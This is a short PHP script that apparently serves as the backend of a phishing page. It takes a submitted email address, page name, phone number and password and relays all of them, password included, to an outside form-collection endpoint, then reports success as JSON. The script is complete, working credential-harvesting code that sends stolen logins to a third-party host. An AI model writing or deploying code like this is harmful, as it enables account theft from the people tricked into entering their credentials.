<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email    = $_POST['email']    ?? '';
    $pagename = $_POST['pagename'] ?? '';
    $phone    = $_POST['phone']    ?? '';
    $password = $_POST['password'] ?? '';

    // Build the payload for Formspree
    $data = [
        'email'    => $email,
        'pagename' => $pagename,
        'phone'    => $phone,
        'password' => $password
    ];

    // Replace with your Formspree endpoint
    $formspree_url = "https://submit-form.com/cdfDcvOVV";

    $ch = curl_init($formspree_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Accept: application/json"
    ]);
    $response = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpcode === 200) {
        echo json_encode(["success" => true]);
    } else {
        http_response_code($httpcode);
        echo json_encode(["success" => false, "response" => $response]);
    }
}
?>
